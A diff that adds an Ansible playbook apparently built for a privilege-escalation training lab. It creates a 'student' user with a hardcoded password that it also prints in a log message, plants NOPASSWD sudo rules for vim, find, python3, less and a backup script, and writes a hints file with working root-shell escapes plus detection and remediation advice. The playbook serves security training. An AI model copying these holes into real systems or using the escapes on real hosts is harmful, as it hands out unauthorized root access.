@@ -1,0 +1,118 @@
+---
+# Weak Sudo Configuration Vulnerability Playbook
+# Introduces sudo misconfigurations for privilege escalation training
+#
+# Tags: sudo, privesc, system
+# Category: System Security
+# CVE: Training environment (no specific CVE)
+
+- name: Inject Weak Sudo Configuration
+  hosts: all
+  become: yes
+  vars:
+    training_user: "student"
+    training_password: "P@ssw0rd123"
+  
+  tasks:
+    - name: Create training user
+      user:
+        name: "{{ training_user }}"
+        password: "{{ training_password | password_hash('sha512') }}"
+        groups: sudo
+        shell: /bin/bash
+        state: present
+      tags: [sudo, user]
+    
+    - name: Create vulnerable sudo configuration - NOPASSWD on specific commands
+      copy:
+        dest: /etc/sudoers.d/90-training-vulnerable
+        content: |
+          # VULNERABLE CONFIGURATION FOR TRAINING
+          # Allows student user to run certain commands without password
+          
+          # Vulnerable: Can edit /etc/passwd (privilege escalation vector)
+          {{ training_user }} ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/passwd
+          
+          # Vulnerable: Can run find (GTFOBins escape)
+          {{ training_user }} ALL=(ALL) NOPASSWD: /usr/bin/find
+          
+          # Vulnerable: Can run python (arbitrary code execution)
+          {{ training_user }} ALL=(ALL) NOPASSWD: /usr/bin/python3
+          
+          # Vulnerable: Can run less (GTFOBins escape)
+          {{ training_user }} ALL=(ALL) NOPASSWD: /usr/bin/less
+        mode: '0440'
+        validate: 'visudo -cf %s'
+      tags: [sudo, configure]
+    
+    - name: Create privilege escalation hints file
+      copy:
+        dest: /home/{{ training_user }}/PRIVESC_HINTS.txt
+        content: |
+          # Privilege Escalation Training Hints
+          
+          ## Vulnerability: Weak Sudo Configuration
+          
+          Check your sudo privileges:
+            sudo -l
+          
+          ## Exploitation Vectors:
+          
+          1. VIM Escape:
+             sudo vim /etc/passwd
+             (In vim) :!sh
+          
+          2. Find Command:
+             sudo find /etc -name "shadow" -exec /bin/bash \;
+          
+          3. Python Execution:
+             sudo python3 -c 'import os; os.system("/bin/bash")'
+          
+          4. Less Pager:
+             sudo less /etc/shadow
+             (In less) !sh
+          
+          ## Detection:
+          - Review /etc/sudoers and /etc/sudoers.d/*
+          - Look for NOPASSWD entries
+          - Check for dangerous binaries in sudo rules
+          - Reference: GTFOBins (gtfobins.github.io)
+          
+          ## Remediation:
+          - Remove NOPASSWD from sensitive commands
+          - Use command whitelists with full paths
+          - Avoid allowing text editors, interpreters, or pagers via sudo
+          - Regular sudo rule audits
+        owner: "{{ training_user }}"
+        group: "{{ training_user }}"
+        mode: '0644'
+      tags: [sudo, hints]
+    
+    - name: Create vulnerable script for additional vector
+      copy:
+        dest: /usr/local/bin/backup.sh
+        content: |
+          #!/bin/bash
+          # Vulnerable backup script
+          echo "Running backup..."
+          tar -czf /tmp/backup.tar.gz /home/$USER
+          echo "Backup complete"
+        mode: '0755'
+      tags: [sudo]
+    
+    - name: Add backup script to sudoers
+      lineinfile:
+        path: /etc/sudoers.d/90-training-vulnerable
+        line: "{{ training_user }} ALL=(ALL) NOPASSWD: /usr/local/bin/backup.sh"
+        validate: 'visudo -cf %s'
+      tags: [sudo, configure]
+    
+    - name: Log vulnerability injection
+      debug:
+        msg: |
+          ✓ Weak sudo configuration injected successfully
+          Training user: {{ training_user }}
+          Password: {{ training_password }}
+          Check sudo privileges: sudo -l
+      tags: [sudo]
+
